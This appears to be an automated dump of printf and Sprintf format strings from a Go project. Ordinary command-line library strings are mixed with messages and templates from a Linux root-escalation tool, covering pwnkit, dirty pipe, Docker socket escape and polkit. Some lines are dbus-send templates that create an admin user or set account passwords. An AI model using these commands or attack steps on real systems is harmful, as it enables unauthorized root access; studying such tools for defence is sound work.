					""//go:build %s\npackage cve20214034\n\nvar pwnkit_%s_sharedobj = []byte{"","
		`--system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User%s org.freedesktop.Accounts.User.SetPassword string:%s string:lol`,"
		`^\s*(%s)\s*(%s)\s*$`,"
"Fprintf(&buf, ""+%s"", v.metadata)"
"Fprintf(&buf, ""-%s"", v.pre)"
"Fprintf(&buf, strings.Join(fmtParts, "".""))"
"Fprintf(f.out(), ""Flag --%s has been deprecated, %s\n"", flag.Name, flag.Deprecated)"
"Fprintf(f.out(), ""Flag shorthand -%s has been deprecated, %s\n"", flag.Shorthand, flag.ShorthandDeprecated)"
"Fprintf(f.out(), ""Usage of %s:\n"", f.name)"
"Fprintf(f.out(), msg)"
"Fprintf(finalCmd.ErrOrStderr(), ""Completion ended with directive: %s\n"", directive.string())"
"Fprintf(finalCmd.OutOrStdout(), "":%d\n"", directive)"
"Fprintf(os.Stderr, ""Usage of %s:\n"", os.Args[0])"
"Fprintf(os.Stderr, format+""\n"", args...)"
"Fprintf(os.Stdout, input, a...)"
"Fprintf(w io.Writer, input string, a ...interface{}) error {"
"Fprintf(w, ""%s\n"", input)"
"Fprintf(w, format, a...)"
"Printf("" %s\r\n"", line)"
"Printf(""%s is less than %s"", v1, v2)"
"Printf(""%s satisfies constraints %s"", v1, constraints)"
"Printf(""<blue>[</blue><red>%s</red><blue>]</blue>"", logger.title)"
"Printf(""<red>this text is <bold>red</bold></red> and the following is <green>%s</green>\n"", ""not red"")"
"Printf(""Adding env var(s)..."")"
"Printf(""Assessing machine state..."")"
"Printf(""Attempting authentication as %s..."", username)"
"Printf(""Attempting authentication as new user..."")"
"Printf(""Attempting escalation to root..."")"
"Printf(""Attempting to create user '%s' by forcing UID=0..."", username)"
"Printf(""Attempting to install '%s' by forcing UID=0..."", name)"
"Printf(""Attempting to set root password..."")"
"Printf(""Attempting to set user password..."")"
"Printf(""Authenticated as %s (%s)!"", user.Username, user.Uid)"
"Printf(""Authenticated as %s!"", username)"
"Printf(""Authenticated as root!"")"
"Printf(""Authenticating with sudo...\r"")"
"Printf(""Average time for package install to fail authentication is %s"", avgTime)"
"Printf(""Average time for password set to fail authentication is %s"", avgTime)"
"Printf(""Average time for user creation to fail authentication is %s"", avgTime)"
"Printf(""Backdooring host at %s from guest..."", path)"
"Printf(""Build failed, looking for existing images instead..."")"
"Printf(""Building malicious docker image..."")"
"Printf(""C compiler not available, using precompiled shared object..."")"
"Printf(""Checking for opportunities..."")"
"Printf(""Checking permissions..."")"
"Printf(""Cleaning up image..."")"
"Printf(""Command %q is deprecated, %s\n"", c.Name(), c.Deprecated)"
"Printf(""Compiling shared object..."")"
"Printf(""Continuing to look for opportunities"")"
"Printf(""Creating evil container..."")"
"Printf(""Creating pipe..."")"
"Printf(""Determining pipe size..."")"
"Printf(""Disclosure failed: %s"", err)"
"Printf(""Docker socket at %s is writable!"", v.sockPath)"
"Printf(""Done."")"
"Printf(""Draining pipe..."")"
"Printf(""Dropping you into a shell..."")"
"Printf(""Exploit failed with image '%s'"", image)"
"Printf(""Exploit failed: %s"", err)"
"Printf(""Filling pipe..."")"
"Printf(""Finished attempting to set password."")"
"Printf(""Gathering information..."")"
"Printf(""Inside rootCmd PersistentPostRun with args: %v\n"", args)"
"Printf(""Inside rootCmd PersistentPreRun with args: %v\n"", args)"
"Printf(""Inside rootCmd PostRun with args: %v\n"", args)"
"Printf(""Inside rootCmd PreRun with args: %v\n"", args)"
"Printf(""Inside rootCmd Run with args: %v\n"", args)"
"Printf(""Inside subCmd PersistentPostRun with args: %v\n"", args)"
"Printf(""Inside subCmd PostRun with args: %v\n"", args)"
"Printf(""Inside subCmd PreRun with args: %v\n"", args)"
"Printf(""Inside subCmd Run with args: %v\n"", args)"
"Printf(""Kernel version %s is vulnerable!"", ver)"
"Printf(""No exploit found for '%s'"", exploitName)"
"Printf(""No local exploit available for '%s'"", exploit.Name)"
"Printf(""Nothing found to exploit."")"
"Printf(""Opening '%s' for read..."", path)"
"Printf(""Opportunity found, trying to exploit it..."")"
"Printf(""Package '%s' is not installed, trying to force installation via packagekit..."", name)"
"Printf(""Package '%s' was installed!"", name)"
"Printf(""Pipe drained."")"
"Printf(""Pipe size is %d."", size)"
"Printf(""Please exit the shell once you are finished to ensure the contents of /etc/passwd is restored."")"
"Printf(""Please wait ~60s..."")"
"Printf(""Polkit version is vulnerable!"")"
"Printf(""Removing backdoor from host..."")"
"Printf(""Removing container..."")"
"Printf(""Restoring contents of /etc/passwd..."")"
"Printf(""Running payload..."")"
"Printf(""Sampling timing of package installation command..."")"
"Printf(""Sampling timing of password set command..."")"
"Printf(""Sampling timing of user creation command..."")"
"Printf(""Session complete."")"
"Printf(""Setting up filesystem tree..."")"
"Printf(""Setting up terminal..."")"
"Printf(""Setting up tty..."")"
"Printf(""Splicing data..."")"
"Printf(""Starting %s with malicious environment variables set..."", pkexecPath)"
"Printf(""Starting command with pty..."")"
"Printf(""Starting evil container..."")"
"Printf(""Starting root shell..."")"
"Printf(""Starting shell..."")"
"Printf(""System is not vulnerable to '%s' - cannot exploit."", exploit.Name)"
"Printf(""System is vulnerable! Run again with '--exploit %s' to exploit it."", exploit.Name)"
"Printf(""Unknown help topic %#q\n"", args)"
"Printf(""User '%s' was created with UID (%s)!"", user.Username, user.Uid)"
"Printf(""Using command '%s'..."", command)"
"Printf(""Write of '%s' successful!"", path)"
"Printf(""Writing local gconv-modules..."")"
"Printf(""Writing payload..."")"
"Printf(""Writing payload...\r"")"
"Printf(""Writing temporary file..."")"
"Printf(""Writing to dirty pipe..."")"
"Printf(""You are already root."")"
"Printf(""\r<blue>[</blue><yellow>+</yellow><blue>]</blue>"")"
"Printf(""\r[sudo] password: "")"
"Printf(""\x1b[34m""+`"
"Printf(""conn addr=%v fd=%d"", sa.(*unix.SockaddrRFCOMM).Addr, nfd)"
"Printf(""error resizing pty: %s"", err)"
"Printf(format string, args ...interface{}) {"
"Printf(format string, i ...interface{}) {"
"Printf(input string, a ...interface{}) error {"
"Sprintf(
"Sprintf(""        aliashash[%q]=%q\n"", value, cmd.Name()))"
"Sprintf(""        command_aliases+=(%q)\n"", value))"
"Sprintf(""      --%s"", flag.Name)"
"Sprintf(""    commands+=(%q)\n"", c.Name()))"
"Sprintf(""    flags_completion+=(%q)\n"", ext))"
"Sprintf(""    flags_completion+=(%q)\n"", handlers))"
"Sprintf(""    flags_with_completion+=(%q)\n"", name))"
"Sprintf(""    last_command=%q\n"", commandName))"
"Sprintf(""    local_nonpersistent_flags+=(\""-%s\"")\n"", flag.Shorthand))"
"Sprintf(""    must_have_one_flag+=(\""-%s""+cbn, flag.Shorthand))"
"Sprintf(""    must_have_one_noun+=(%q)\n"", value))"
"Sprintf(""    noun_aliases+=(%q)\n"", value))"
"Sprintf(""  -%s, --%s"", flag.Shorthand, flag.Name)"
"Sprintf("" %d,"", b))"
"Sprintf("" (DEPRECATED: %s)"", flag.Deprecated)"
"Sprintf("" (default %q)"", flag.DefValue)"
"Sprintf("" (default %s)"", flag.DefValue)"
"Sprintf(""# bash completion for %-36s -*- shell-script -*-\n"", name))"
"Sprintf(""# fish completion for %-36s -*- shell-script -*-\n"", name))"
"Sprintf(""%%-%ds"", padding)"
"Sprintf(""%X"", []byte(bytesHex))"
"Sprintf(""%[2]s is a special command that is used by the shell completion logic\n%[1]s"","
"Sprintf(""%d"", d)"
"Sprintf(""%d"", val)"
"Sprintf(""%d.%d.%d"", segments[0], segments[1], segments[2])"
"Sprintf(""%d.%d.%d.%d"", m[0], m[1], m[2], m[3])"
"Sprintf(""%f"", d)"
"Sprintf(""%f"", val)"
"Sprintf(""%q shorthand is more than one ASCII character"", flag.Shorthand)"
"Sprintf(""%s (CfgMgr error: 0x%08x)"", win32Error.Error(), uint32(ret))"
"Sprintf(""%s [command-line]"", ShellCompRequestCmd),"
"Sprintf(""%s flag redefined: %s"", f.name, flag.Name)"
"Sprintf(""%s"", d)"
"Sprintf(""%s"", val)"
"Sprintf(""%s%c"", tagName, r)"
"Sprintf(""%s%s"", activeHelpMarker, activeHelpStr))"
"Sprintf(""%s%s"", name, activeHelpEnvVarSuffix))"
"Sprintf(""%s\n"", msg))"
"Sprintf(""%s\n"", msg), printToStdErr)"
"Sprintf(""%s\n"", password))); err != nil {"
"Sprintf(""%s\t%s"", flagName, flag.Usage))"
"Sprintf(""%s\t%s"", subCmd.Name(), subCmd.Short))"
"Sprintf(""-%s, --%s"", flag.Shorthand, flag.Name)"
"Sprintf(""--%s"", flag.Name)"
"Sprintf(""<%s>"", tagName)))"
"Sprintf(""BAD_VERSION_%d"", v)"
"Sprintf(""BadVariant%d"", int(v))"
"Sprintf(""CfgMgr error: 0x%08x"", uint32(ret))"
"Sprintf(""Domain%d"", int(d))"
"Sprintf(""ERROR: unexpected ShellCompDirective value: %d"", d)"
"Sprintf(""Failed to find flag %q and mark it as being in a mutually exclusive flag group"", v))"
"Sprintf(""Failed to find flag %q and mark it as being required in a flag group"", v))"
"Sprintf(""NTSTATUS 0x%08x"", uint32(s))"
"Sprintf(""PWNFILE=%s"", tempFile.Name()))"
"Sprintf(""VERSION_%d"", v)"
"Sprintf(""[=%s]"", flag.NoOptDefVal)"
"Sprintf(""[=\""%s\""]"", flag.NoOptDefVal)"
"Sprintf(""[Debug] %s"", msg)"
"Sprintf(""[Error] %s"", msg)"
"Sprintf(""\t%v\n"", s)"
"Sprintf(""_%s()\n{\n"", commandName))"
"Sprintf(""_%s_root_command()\n{\n"", commandName))"
"Sprintf(""__%[1]s_handle_go_custom_completion"", cmd.Root().Name())}"
"Sprintf(""__%s_handle_filename_extension_flag "", cmd.Root().Name()) + strings.Join(value, ""|"")"
"Sprintf(""__%s_handle_subdirs_in_dir_flag "", cmd.Root().Name()) + value[0]"
"Sprintf(""__start_%s()\n"", name))"
"Sprintf(""can not look up shorthand which is more than one ASCII character: %q"", name)"
"Sprintf(""gtfobins:%s"", binaryName),"
"Sprintf(""http://localhost/build?t=%s"", imageName),"
"Sprintf(""http://localhost/containers/%s/start"", container.ID), ""application/json"", nil)"
"Sprintf(""http://localhost/containers/%s/wait"", container.ID), ""application/json"", nil)"
"Sprintf(""http://localhost/containers/%s?force=1"", id), nil)"
"Sprintf(""http://localhost/images/%s?force=1"", name), nil)"
"Sprintf(""invalid UUID length: %d"", err.len)"
"Sprintf(""sharedobject_%s_%s.go"", desc, platform.goarch)"
"Sprintf(""su - %s"", user.Username))"
"Sprintf(""su - %s"", username))"
"Sprintf(""traitor%d"", rand.Intn(10000))"
"Sprintf(""unable to redefine %q shorthand in %q flagset: it's already used for %q flag"", c, f.name, used.Name)"
"Sprintf(`--session --print-reply --type=method_call --dest=org.freedesktop.PackageKit /org/freedesktop/PackageKit org.freedesktop.PackageKit.Modify.InstallPackageNames uint32:1 array:string:%s string:`,"
"Sprintf(`--system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:%s string:%s int32:1`,"
"Sprintf(`if [[ $(type -t compopt) = ""builtin"" ]]; then"
"Sprintf(format, a...)"
"Sprintf(format, args...)"
"Sprintf(format, flag.Name))"
"Sprintf(format, i...))"
"Sprintf(format, name))"
"Sprintf(input string, a ...interface{}) string {"
"Sprintf(shortDesc, ""bash""),"
"Sprintf(shortDesc, ""fish""),"
"Sprintf(shortDesc, ""powershell""),"
"Sprintf(shortDesc, ""zsh""),"
"Sprintf(template, s)"
"printf(""\n\n// Error table\n"");"
"printf(""\n\n// Signal table\n"");"
"printf(""\t%d: \""%s\"",\n"", e, buf);"
"printf(""\t%s = C.%s\n"", $2, $2)}"
"printf(""\t%s = C.%s\n"", substr($2,3), $2)}"
"printf(""\tdesc string\n"");"
"printf(""\tname string\n"");"
"printf(""\tnum  syscall.Errno\n"");"
"printf(""\tnum  syscall.Signal\n"");"
"printf(""\t{ %d, \""%s\"", \""%s\"" },\n"", e, errors[i].name, buf);"
"printf(""\t{ %d, \""%s\"", \""%s\"" },\n"", e, signals[i].name, buf);"
"printf(""var errorList = [...]struct {\n"");"
"printf(""var errors = [...]string {\n"");"
"printf(""var signalList = [...]struct {\n"");"
"printf(""var signals = [...]string {\n"");"
"printf(""} {\n"");"
"printf(""}\n\n"");"
Sprintf(`
Sprintf(`# bash completion V2 for %-36[1]s -*- shell-script -*-
Sprintf(`# powershell completion for %-36[1]s -*- shell-script -*-
Sprintf(`#compdef %[1]s
Sprintf(`#include <stdio.h>
Sprintf(`Generate the autocompletion script for %[1]s for the specified shell.
Sprintf(`Generate the autocompletion script for powershell.
Sprintf(`Generate the autocompletion script for the bash shell.
Sprintf(`Generate the autocompletion script for the fish shell.
Sprintf(`Generate the autocompletion script for the zsh shell.
Sprintf(`To load completions:
Sprintf(`{
